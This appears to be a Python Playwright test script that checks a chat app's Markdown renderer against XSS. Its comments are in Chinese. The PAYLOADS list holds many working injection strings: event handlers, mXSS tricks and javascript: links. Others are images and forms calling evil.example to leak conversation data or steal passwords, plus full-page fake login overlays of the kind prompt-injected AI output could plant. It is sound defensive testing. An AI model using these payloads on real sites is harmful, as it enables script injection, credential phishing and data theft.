"""前端 XSS 回归：用真实浏览器 + 真实的渲染模块（src/utils/markdown.ts）跑一大批注入载荷。

聊天回答、Markdown 组件等位置都是 v-html 渲染 AI 输出 / 用户内容，所以 renderMarkdown 是唯一的防线。
检查两件事：
1. 渲染结果里不能留下可执行或可欺骗的东西：script / iframe / object / embed / 表单控件 / 音视频 / meta / base / link / style，
   任何 on* 属性，javascript: / vbscript: / data:text 协议的链接和资源，不带 rel=noopener 的 target=_blank；
   以及“提示注入”能利用的：style / id / name / srcset 属性、除 cite-ref 和 language-* 之外的 class（Tailwind 的 fixed inset-0
   能盖住整个页面做假登录框）、会自动加载的外部图片（![x](https://evil/leak?d=对话内容) 零点击外泄）；
2. 真的把结果放进页面并等一会儿，每个载荷自带一个“执行标记”，任何一个被触发都算失败。
前提：Vite 在 5174 端口运行（`npm --prefix frontend run dev -- --host 127.0.0.1 --port 5174 --strictPort`）。
用法：$env:PLAYWRIGHT_CHANNEL='msedge'; .venv\\Scripts\\python.exe scripts\\check_xss_browser.py [--url http://127.0.0.1:5174]
"""
import asyncio
import json
import os
import sys

from playwright.async_api import async_playwright

URL = sys.argv[sys.argv.index("--url") + 1] if "--url" in sys.argv else "http://127.0.0.1:5174"

# 每个载荷里的 {F} 会被替换成该载荷专属的执行标记（window.__x[i] = 1）
PAYLOADS = [
    '<img src=x onerror="{F}">', "<img src=x onerror='{F}'>", "<img src=x onerror={F}>", '<img/src=x/onerror="{F}">', '<IMG SRC=x ONERROR="{F}">',
    '<svg onload="{F}"></svg>', '<svg><script>{F}</script></svg>', '<svg><animate onbegin="{F}" attributeName=x dur=1s>', '<svg><a xlink:href="javascript:{F}"><text>x</text></a></svg>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=&quot;{F}&quot;&gt;">',        # mXSS
    '<svg><p><style><a title="</style><img src onerror=&quot;{F}&quot;>">',                                                       # mXSS
    '<noscript><p title="</noscript><img src=x onerror=&quot;{F}&quot;>">',                                                       # mXSS
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror="{F}">',                                              # mXSS（嵌套 form）
    '<script>{F}</script>', '<script src="//evil.example/x.js"></script>', '<iframe src="javascript:{F}"></iframe>', '<iframe srcdoc="<script>parent.{F}</script>"></iframe>',
    '<object data="javascript:{F}"></object>', '<embed src="javascript:{F}">', '<base href="//evil.example/">', '<meta http-equiv="refresh" content="0;url=javascript:{F}">',
    '<link rel="stylesheet" href="//evil.example/x.css">', '<style>@import url(//evil.example/x.css);</style>', '<style>body{background:url(//evil.example/leak?c=1)}</style>',
    '<form action="javascript:{F}"><input type=submit></form>', '<button formaction="javascript:{F}">x</button>', '<input autofocus onfocus="{F}">', '<select autofocus onfocus="{F}">',
    '<textarea autofocus onfocus="{F}"></textarea>', '<details open ontoggle="{F}">x</details>', '<video src=x onerror="{F}"></video>', '<audio src=x onerror="{F}"></audio>',
    '<video><source onerror="{F}"></video>', '<marquee onstart="{F}">x</marquee>', '<body onload="{F}">', '<div onmouseover="{F}">hover</div>', '<a href="javascript:{F}">x</a>',
    '<a href="jav&#x09;ascript:{F}">x</a>', '<a href="&#106;avascript:{F}">x</a>', '<a href=" javascript:{F}">x</a>', '<a href="vbscript:{F}">x</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuezF9PC9zY3JpcHQ+">x</a>', '<a href="https://example.com" target="_blank">x</a>',
    '[x](javascript:{F})', '[x](JaVaScRiPt:{F})', '[x](  javascript:{F})', '[x](vbscript:{F})', '[x](data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=)', '[x](#" onclick="{F}")',
    '![x](javascript:{F})', '![x](x" onerror="{F}")', '![x](x)<!-- -->', '[x](https://example.com "t\\" onmouseover=\\"{F}")',
    '`<script>{F}</script>`', '```html\n<script>{F}</script>\n```', '> <img src=x onerror="{F}">', '- <img src=x onerror="{F}">', '| a |\n|---|\n| <img src=x onerror="{F}"> |',
    '【来源1" onmouseover="{F}】', '【来源1】<img src=x onerror="{F}">', '<span class="cite-ref" data-cite="1" onclick="{F}">【来源1】</span>',
    '[x](attachment://0123456789abcdef01234567)', '[x](attachment://zzzz" onclick="{F}")',
    # ---- 提示注入能用的“看起来没脚本”的手法 ----
    '<form action="https://evil.example/steal"><p>登录已过期，请重新输入密码</p><input type="password" name="p"><button>登录</button></form>',
    '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999">登录已过期，请重新登录</div>',
    '<div class="fixed inset-0 z-50 bg-white">登录已过期</div>', '<p class="fixed inset-0 z-[9999] bg-white text-black">假界面</p>',
    '![x](https://evil.example/leak?d=SECRET)', '![x](//evil.example/leak?d=SECRET)', '<img src="https://evil.example/leak?d=SECRET">', '<img src="http://evil.example/leak">',
    '<img srcset="https://evil.example/a.png 1x" src="data:image/png;base64,AAAA">', '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
    '<picture><source srcset="https://evil.example/a.png"><img src="https://evil.example/b.png"></picture>', '<video src="https://evil.example/t.mp4" autoplay></video>',
    '<div id="app">clobber</div>', '<a name="document">x</a>', '<img name="cookie" src="data:image/png;base64,AAAA">', '<div class="cite-ref fixed inset-0">x</div>',
]

FORBIDDEN_TAGS = "script,iframe,object,embed,form,input,button,select,option,textarea,fieldset,label,meta,base,link,style,svg,math,video,audio,source,track,picture,marquee,body,frame,frameset,applet"
CHECK = """async ({payloads, forbidden}) => {
    const { renderMarkdown } = await import('/src/utils/markdown.ts');
    window.__x = {};
    const problems = [];
    const container = document.createElement('div');
    document.body.append(container);
    for (let i = 0; i < payloads.length; i++) {
        const flag = `window.__x[${i}]=1`;
        const source = payloads[i].split('{F}').join(flag);
        for (const citations of [false, true]) {
            container.innerHTML = renderMarkdown(source, citations);
            const bad = container.querySelector(forbidden);
            if (bad) problems.push({i, payload: payloads[i], why: `残留标签 <${bad.tagName.toLowerCase()}>`});
            for (const el of container.querySelectorAll('*')) {
                for (const attr of el.attributes) {
                    const value = (attr.value || '').replace(/[\\s\\u0000-\\u001f]+/g, '').toLowerCase();
                    if (attr.name.startsWith('on')) problems.push({i, payload: payloads[i], why: `事件属性 ${attr.name}`});
                    if (['href', 'src', 'xlink:href', 'action', 'formaction', 'data', 'srcdoc'].includes(attr.name) &&
                        /^(javascript|vbscript|data:text|data:application)/.test(value)) problems.push({i, payload: payloads[i], why: `危险地址 ${attr.name}=${attr.value.slice(0, 40)}`});
                }
                for (const name of ['style', 'id', 'name', 'srcset', 'poster', 'background', 'ping'])
                    if (el.hasAttribute(name)) problems.push({i, payload: payloads[i], why: `不该保留的属性 ${name}`});
                for (const token of (el.getAttribute('class') || '').split(/\\s+/).filter(Boolean))
                    if (!/^(cite-ref|language-[a-z0-9+#_-]+)$/i.test(token)) problems.push({i, payload: payloads[i], why: `不该保留的 class「${token}」（可用来盖住整个页面）`});
                if (el.tagName === 'IMG') {
                    const src = el.getAttribute('src') || '';
                    if (!/^data:image\\/(png|jpe?g|gif|webp);base64,/i.test(src) && !(src.startsWith('/') && !src.startsWith('//')))
                        problems.push({i, payload: payloads[i], why: `会自动加载的外部图片 ${src.slice(0, 50)}`});
                }
                if (el.tagName === 'A' && el.getAttribute('target') === '_blank' && !/noopener/.test(el.getAttribute('rel') || ''))
                    problems.push({i, payload: payloads[i], why: 'target=_blank 没有 rel=noopener（反向标签页劫持）'});
            }
        }
        container.innerHTML = renderMarkdown(source, true);
    }
    await new Promise(resolve => setTimeout(resolve, 300));
    for (const key of Object.keys(window.__x)) problems.push({i: Number(key), payload: payloads[Number(key)], why: '注入的脚本真的执行了'});
    container.remove();
    return problems;
}"""


async def main() -> int:
    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(channel=os.environ.get("PLAYWRIGHT_CHANNEL") or None)
        page = await browser.new_page()
        await page.goto(URL, wait_until="domcontentloaded")
        problems = await page.evaluate(CHECK, {"payloads": PAYLOADS, "forbidden": FORBIDDEN_TAGS})
        # 正常内容必须仍然正常渲染（防止“全部清空”这种假通过）
        sane = await page.evaluate("""async () => {
            const { renderMarkdown } = await import('/src/utils/markdown.ts');
            const c = document.createElement('div');
            c.innerHTML = renderMarkdown('**粗体** [链接](https://example.com) `代码` 【来源2】\\n\\n- 列表\\n\\n| a | b |\\n|---|---|\\n| 1 | 2 |\\n\\n```python\\nprint(1)\\n```\\n\\n![图](data:image/png;base64,iVBORw0KGgo=)', true);
            return {strong: !!c.querySelector('strong'), link: c.querySelector('a')?.getAttribute('href'), code: !!c.querySelector('code'),
                    cite: !!c.querySelector('.cite-ref[data-cite="2"]'), li: !!c.querySelector('li'), table: !!c.querySelector('table'),
                    lang: !!c.querySelector('code.language-python'), dataImg: !!c.querySelector('img[src^="data:image/png"]'), extImg: (() => { const d = document.createElement('div'); d.innerHTML = renderMarkdown('![x](https://evil.example/a.png)'); return {img: !!d.querySelector('img'), link: d.querySelector('a')?.getAttribute('rel') || ''}; })()};
        }""")
        await browser.close()
    print(json.dumps({"payloads": len(PAYLOADS), "problems": len(problems), "sane": sane}, ensure_ascii=False))
    for item in problems[:30]:
        print("  FAIL", item["why"], "<=", item["payload"][:90].replace("\n", "\\n"))
    healthy = all([sane["strong"], sane["link"] == "https://example.com", sane["code"], sane["cite"], sane["li"], sane["table"], sane["lang"], sane["dataImg"],
                   not sane["extImg"]["img"], "noopener" in sane["extImg"]["link"]])
    if not healthy:
        print("  FAIL 正常 Markdown 没有渲染出来：", sane)
    return 0 if not problems and healthy else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
